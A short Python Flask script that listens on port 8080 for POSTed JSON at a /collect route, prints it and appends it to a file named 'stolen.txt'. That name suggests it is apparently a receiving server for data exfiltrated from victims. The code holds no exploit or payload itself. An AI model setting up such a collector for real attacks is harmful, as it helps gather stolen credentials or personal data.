from flask import Flask, request

app = Flask(__name__)

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    # 打印到终端（调试用）
    print(f"收到数据: {data}")
    # 保存到文件
    with open('stolen.txt', 'a') as f:
        f.write(f"{data}\n")
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)